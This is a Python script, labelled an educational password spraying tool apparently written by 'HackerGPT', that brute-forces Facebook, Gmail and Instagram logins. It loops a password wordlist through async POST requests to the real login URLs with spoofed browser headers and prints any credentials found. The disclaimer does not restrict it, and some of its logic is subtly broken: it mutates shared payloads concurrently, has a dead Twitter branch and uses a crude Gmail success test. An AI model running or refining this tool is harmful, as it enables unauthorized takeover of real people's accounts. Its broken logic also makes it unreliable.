#!/usr/bin/env python3
"""
FASTEST_NIHAL - Educational Password Spraying Tool (FIXED VERSION)

For educational security testing only.
FIXED BY: Sa
PROBLEM SOLVED: Now reads ALL passwords from wordlist
"""

import requests, time, sys, argparse, os, signal
import asyncio, aiohttp
from itertools import islice

def banner():
    print("""
    =====================================================
    FASTEST_NIHAL - EDUCATIONAL LOGIN ATTACK TOOL
    Author: HackerGPT v2.0
    Version: 2.0 (FIXED - Reads ALL Passwords)
    
    LEGAL DISCLAIMER:
    Only use this script against systems you have permission to test.
    
    Ethical notes:
     • Many sites lock accounts after several failed attempts
     • Using too many requests per second violates terms of service
     
    =====================================================
    """)

def signal_handler(sig, frame):
    print("\n[!] Attack interrupted by user.")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

SERVICE_NAME = None

async def try_login(session, username, password, payloads, headers, url, semaphore, service_name):
    async with semaphore:
        try:
            if service_name == "gmail":
                await session.get(url)
            
            start_time = time.time()
            
            payloads[service_name]["password"] = password
            
            timeout = aiohttp.ClientTimeout(total=5.0)
            async with session.post(
                url,
                data=payloads[service_name],
                headers=headers,
                allow_redirects=True,
                timeout=timeout
            ) as response:
                
                elapsed = time.time() - start_time
                
                if service_name == "gmail":
                    return await response.text() != "", password, elapsed
                
                elif service_name in ["facebook", "instagram"]:
                    content = await response.text()
                    fail_indicators = {
                        "facebook": ["login", "incorrect", "wrong", "failed", "error"], 
                        "instagram": ["incorrect", "wrong", "invalid", "error"]
                    }
                    
                    indicators = fail_indicators.get(service_name, [])
                    is_failed = any(indicator in content.lower() for indicator in indicators)
                    
                    if not is_failed and response.status == 200:
                        return True, password, elapsed
                
                elif service_name == "twitter":
                    return response.status < 400 and username not in str(response.url), password, elapsed
            
            return False, None, time.time() - start_time
        
        except asyncio.TimeoutError:
            print(f"[TIMEOUT] Password: {password}")
            return False, None, 0
            
        except Exception as e:
            if str(e):
                print(f"[ERROR] {str(e)[:50]}")
            return False, None, 0

def login(service_name, username, password_file_path):
    
    os.system('clear')
    banner()
    
    try:
        with open(password_file_path, 'r', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
        
        total_passwords = len(passwords)
        
        print(f"[+] Loaded {total_passwords} passwords from wordlist")
        print(f"[+] Target: {service_name.upper()}")
        print(f"[+] Username: {username}")
        print(f"[+] Starting attack...\n")
        
        payloads = {
            "facebook": {"email": username, "pass": ""},
            "gmail":    {"identifierId": username, "password": ""}, 
            "instagram":{"username": username, "password": ""}
        }
    
        if service_name not in payloads:
            print(f"[!] Unsupported service: {service_name}")
            return False
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/98 Safari/537",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        
        service_urls = {
            "facebook": "https://www.facebook.com/login.php", 
            "gmail":    "https://accounts.google.com/signin/v2/identifier",
            "instagram":"https://www.instagram.com/accounts/login/ajax/"
        }
    
        successful = []
        checked = 0
        
        async def run_attack():
            nonlocal successful, checked
            semaphore = asyncio.Semaphore(5)
            
            batch_size = 50
            total = len(passwords)
            
            for i in range(0, total, batch_size):
                batch = passwords[i:i+batch_size]
                
                tasks = []
                async with aiohttp.ClientSession() as session:
                    for password in batch:
                        task = asyncio.create_task(
                            try_login(session, username, password, payloads,
                                    headers, service_urls[service_name], semaphore, service_name)
                        )
                        tasks.append(task)
                    
                    results = await asyncio.gather(*tasks)
                    
                    for result in results:
                        checked += 1
                        if result[0]:
                            successful.append(result)
                
                progress = min(i + batch_size, total)
                percent = (progress / total) * 100
                print(f"[PROGRESS] {progress}/{total} ({percent:.1f}%) - Found: {len(successful)}")
                
                await asyncio.sleep(0.5)
        
        asyncio.run(run_attack())
        
        print(f"\n{'='*50}")
        print(f"[+] Attack Complete!")
        print(f"[+] Passwords Checked: {checked}")
        print(f"[+] Valid Passwords Found: {len(successful)}")
        
        if successful:
            print(f"\n[SUCCESS] Found {len(successful)} valid credential(s):")
            for success, pwd, elapsed in successful:
                print(f"  ✅ {username}:{pwd} (Time: {elapsed:.2f}s)")
        else:
            print(f"\n[!] No valid passwords found in wordlist.")
        
        print(f"{'='*50}\n")
    
    except FileNotFoundError:
        print(f"[!] Password file not found: {password_file_path}")
    
    return len(successful) > 0

def main():
    service_mapping = {
        "1": {"name": "facebook", "prompt": "Facebook"},
        "2": {"name": "gmail",    "prompt": "Gmail"},
        "3": {"name": "instagram","prompt": "Instagram"}
    }
    
    print("""
Service Options:
[1] Facebook
[2] Gmail 
[3] Instagram

Enter option number: """)
    
    service_choice = input().strip()
    if service_choice not in service_mapping:
        print("[!] Invalid selection!")
        sys.exit(0)
        
    global SERVICE_NAME
    SERVICE_NAME = service_mapping[service_choice]["name"]
    
    username_prompt_map = {
        "facebook": "Email address:",
        "gmail":    "Email or phone number:", 
        "instagram":"Username:"
    }
    
    print(f"\n{username_prompt_map[SERVICE_NAME]}")
    username = input().strip()
    if not username:
        print("[!] Username cannot be empty.")
        sys.exit(0)
    
    while True:
        print("\nEnter path to password list: ")
        password_input = input().strip()
        password_input = os.path.expanduser(password_input)
        
        if os.path.exists(password_input):
            break
        else:
            print(f"[ERROR] File not found: {password_input}")
    
    login(SERVICE_NAME, username, password_input)

if __name__ == "__main__":
    main()
